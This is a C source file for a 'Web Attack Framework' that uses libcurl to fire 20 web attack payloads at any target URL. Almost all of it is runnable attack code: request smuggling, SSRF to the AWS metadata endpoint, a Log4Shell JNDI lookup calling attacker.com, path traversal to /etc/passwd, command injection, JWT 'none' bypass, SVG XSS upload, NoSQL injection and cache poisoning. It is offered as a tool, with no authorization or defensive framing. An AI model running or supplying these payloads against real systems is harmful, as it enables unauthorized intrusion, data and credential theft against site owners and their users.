// ============================================================================
// WEB ATTACK FRAMEWORK v1.0 in C
// 20 Web Application Attack Vectors
// Kompilieren: gcc -o web_attack web_attack_framework.c -lcurl -Wall -O2
// ============================================================================

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>

#define VERSION "1.0"
#define MAX_URL 2048
#define MAX_PAYLOAD 4096
#define MAX_RESPONSE 16384
#define MAX_ATTACKS 20
#define TIMEOUT_MS 15000

// ============================================================================
// FARBEN & OUTPUT
// ============================================================================

#define CR "\x1b[0m"
#define CG "\x1b[32m"
#define CY "\x1b[33m"
#define CRD "\x1b[31m"
#define CC "\x1b[36m"
#define CMG "\x1b[35m"

// ============================================================================
// DATENSTRUKTUREN
// ============================================================================

typedef struct {
    char *memory;
    size_t size;
} response_t;

typedef struct {
    int id;
    const char *name;
    const char *description;
    int (*attack_func)(const char *, const char *, response_t *);
} attack_t;

// ============================================================================
// UTILITY FUNKTIONEN
// ============================================================================

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_t *mem = (response_t *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&mem->memory[mem->size], contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void url_encode(const char *src, char *dst, size_t dst_size) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j < dst_size - 1; i++) {
        if (isalnum(src[i]) || src[i] == '-' || src[i] == '_' || src[i] == '.') {
            dst[j++] = src[i];
        } else {
            j += snprintf(&dst[j], dst_size - j, "%%%02X", (unsigned char)src[i]);
        }
    }
    dst[j] = '\0';
}

void print_result(int status, const char *msg) {
    const char *color = status ? CG : CRD;
    printf("%s[%s]%s %s\n", color, status ? "+" : "-", CR, msg);
}

// ============================================================================
// ATTACK FUNKTIONEN (20 Typen)
// ============================================================================

// 1. HOST HEADER ATTACK
int host_header_attack(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Host: attacker.com");
    headers = curl_slist_append(headers, "X-Forwarded-For: 127.0.0.1");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 2. CRLF / HEADER INJECTION
int crlf_header_injection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?user=%s%%0d%%0aX-Injected:true", base_url, payload);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 3. HTTP REQUEST SMUGGLING
int http_request_smuggling(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char payload_buf[MAX_PAYLOAD];
    snprintf(payload_buf, sizeof(payload_buf),
             "POST %s HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\n"
             "Content-Length: 0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\n\r\n", payload);

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload_buf);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 4. JWT NONE ALGORITHM
int jwt_none_algorithm(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    // JWT mit "none" algorithm
    char jwt_token[] = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.";

    struct curl_slist *headers = NULL;
    char auth_header[256];
    snprintf(auth_header, sizeof(auth_header), "Authorization: Bearer %s", jwt_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 5. SVG UPLOAD (STORED XSS)
int svg_upload_xss(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char svg_payload[MAX_PAYLOAD];
    snprintf(svg_payload, sizeof(svg_payload),
             "<svg onload='alert(\"XSS\")' xmlns='http://www.w3.org/2000/svg'>"
             "<circle cx='50' cy='50' r='40' stroke='black' stroke-width='3' fill='red' />"
             "</svg>");

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_data(part, svg_payload, strlen(svg_payload));
    curl_mime_filename(part, "malicious.svg");
    curl_mime_type(part, "image/svg+xml");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    return success;
}

// 6. JSON MASS ASSIGNMENT
int json_mass_assignment(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char json_payload[MAX_PAYLOAD];
    snprintf(json_payload, sizeof(json_payload),
             "{\"username\":\"%s\",\"role\":\"admin\",\"is_admin\":true}", payload);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 7. SSRF (Server-Side Request Forgery)
int ssrf_attack(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?url=http://localhost:8080/admin", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 8. SSNI (Template Injection)
int template_injection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?name={{7*7}}", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 9. LFI (Local File Inclusion)
int lfi_attack(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?file=../../../../etc/passwd", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 10. OPEN REDIRECT
int open_redirect(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?redirect=https://evil.com", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 11. CSRF (AWS Metadata)
int csrf_aws_metadata(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?target=http://169.254.169.254/latest/meta-data/", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 12. GRAPHQL INTROSPECTION
int graphql_introspection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char json_payload[MAX_PAYLOAD];
    snprintf(json_payload, sizeof(json_payload),
             "{\"query\":\"{__schema{types{name}}}\" }");

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 13. WEBSOCKET INJECTION
int websocket_injection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Upgrade: websocket");
    headers = curl_slist_append(headers, "Connection: Upgrade");
    headers = curl_slist_append(headers, "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==");
    headers = curl_slist_append(headers, "Sec-WebSocket-Version: 13");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 14. COOKIE POISONING
int cookie_poisoning(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_COOKIE, "admin=true; role=admin; auth_token=admin123");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 15. HTTP/2 DESYNC TEST
int http2_desync(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 16. CACHE POISONING
int cache_poisoning(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "X-Original-URL: /admin");
    headers = curl_slist_append(headers, "X-Forwarded-Host: evil.com");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 17. LOG4SHELL HEADER TEST
int log4shell_test(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "User-Agent: ${jndi:ldap://attacker.com/a}");
    headers = curl_slist_append(headers, "X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}}");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// 18. PATH TRAVERSAL
int path_traversal(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s/../../../../../../etc/passwd", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 19. COMMAND INJECTION
int command_injection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s?cmd=id;whoami;uname+-a", base_url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_easy_cleanup(curl);
    return success;
}

// 20. NOSQL INJECTION
int nosql_injection(const char *base_url, const char *payload, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char json_payload[MAX_PAYLOAD];
    snprintf(json_payload, sizeof(json_payload),
             "{\"user\": {\"$ne\": null}, \"password\": {\"$ne\": null}}");

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, base_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);

    int success = (curl_easy_perform(curl) == CURLE_OK);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return success;
}

// ============================================================================
// ATTACK REGISTRY
// ============================================================================

attack_t attacks[MAX_ATTACKS] = {
    {1, "Host Header Attack", "Manipulates Host header for cache/auth bypass", host_header_attack},
    {2, "CRLF / Header Injection", "Injects CRLF to modify HTTP headers", crlf_header_injection},
    {3, "HTTP Request Smuggling", "Exploits HTTP/1.1 ambiguities (CL/TE)", http_request_smuggling},
    {4, "JWT None Algorithm", "Bypasses JWT validation with 'none' algo", jwt_none_algorithm},
    {5, "SVG Upload (Stored XSS)", "Uploads SVG with embedded XSS payload", svg_upload_xss},
    {6, "JSON Mass Assignment", "Modifies object properties via JSON injection", json_mass_assignment},
    {7, "SSRF (Server-Side Request Forgery)", "Forces server to fetch attacker-controlled URLs", ssrf_attack},
    {8, "SSTI (Server-Side Template Injection)", "Injects template expressions {{7*7}}", template_injection},
    {9, "LFI (Local File Inclusion)", "Reads local files via path traversal", lfi_attack},
    {10, "Open Redirect", "Redirects users to attacker-controlled sites", open_redirect},
    {11, "CSRF (AWS Metadata)", "Extracts AWS credentials from metadata", csrf_aws_metadata},
    {12, "GraphQL Introspection", "Enumerates GraphQL schema", graphql_introspection},
    {13, "WebSocket Injection", "Attempts WebSocket upgrade & injection", websocket_injection},
    {14, "Cookie Poisoning", "Injects malicious cookies", cookie_poisoning},
    {15, "HTTP/2 Desync Test", "Tests HTTP/2 protocol desyncs", http2_desync},
    {16, "Cache Poisoning", "Manipulates cache via special headers", cache_poisoning},
    {17, "Log4Shell Header Test", "Tests Log4j JNDI injection patterns", log4shell_test},
    {18, "Path Traversal", "Exploits directory traversal vulnerabilities", path_traversal},
    {19, "Command Injection", "Injects OS commands via parameters", command_injection},
    {20, "NoSQL Injection", "Injects NoSQL operators ($ne, $or, etc.)", nosql_injection}
};

// ============================================================================
// MAIN
// ============================================================================

void print_banner() {
    printf("%s╔════════════════════════════════════════════════════════════╗%s\n", CC, CR);
    printf("%s║  Web Attack Framework v%s - 20 Common Web Vulnerabilities  ║%s\n", CC, VERSION, CR);
    printf("%s╚════════════════════════════════════════════════════════════╝%s\n\n", CC, CR);
}

void print_usage(const char *prog) {
    printf("Usage: %s <target_url> [attack_id] [payload]\n\n", prog);
    printf("Examples:\n");
    printf("  %s http://target.local                  # Run all 20 attacks\n", prog);
    printf("  %s http://target.local 1                # Run only attack #1 (Host Header)\n", prog);
    printf("  %s http://target.local 5 malicious.svg  # Run attack #5 (SVG Upload) with custom payload\n\n", prog);
    printf("Available attacks:\n");
    for (int i = 0; i < MAX_ATTACKS; i++) {
        printf("  %2d. %-30s - %s\n", attacks[i].id, attacks[i].name, attacks[i].description);
    }
}

int main(int argc, char **argv) {
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *target_url = argv[1];
    int attack_id = (argc >= 3) ? atoi(argv[2]) : 0;
    const char *payload = (argc >= 4) ? argv[3] : "test";

    curl_global_init(CURL_GLOBAL_ALL);

    if (attack_id > 0 && attack_id <= MAX_ATTACKS) {
        // Single attack
        printf("%s[*] Running: %s%s\n", CY, attacks[attack_id - 1].name, CR);
        response_t resp = {0};
        resp.memory = malloc(1);
        resp.size = 0;

        int result = attacks[attack_id - 1].attack_func(target_url, payload, &resp);
        print_result(result, attacks[attack_id - 1].description);

        if (result && resp.size > 0) {
            printf("%s[Response Sample]%s (first 200 bytes):\n%.*s\n\n",
                   CG, CR, (int)(resp.size < 200 ? resp.size : 200), resp.memory);
        }

        if (resp.memory) free(resp.memory);
    } else {
        // Run all attacks
        printf("%s[*] Running all 20 attacks against %s%s\n\n", CY, target_url, CR);
        int success = 0;

        for (int i = 0; i < MAX_ATTACKS; i++) {
            response_t resp = {0};
            resp.memory = malloc(1);
            resp.size = 0;

            printf("%s[%2d]%s %-40s ", CY, i + 1, CR, attacks[i].name);
            fflush(stdout);

            int result = attacks[i].attack_func(target_url, payload, &resp);

            if (result) {
                printf("%s✓ OK%s\n", CG, CR);
                success++;
            } else {
                printf("%s✗ Failed%s\n", CRD, CR);
            }

            if (resp.memory) free(resp.memory);
            usleep(500000); // 500ms delay zwischen Angriffen
        }

        printf("\n%s[Summary]%s %d/%d attacks successful\n", CC, CR, success, MAX_ATTACKS);
    }

    curl_global_cleanup();
    return 0;
}
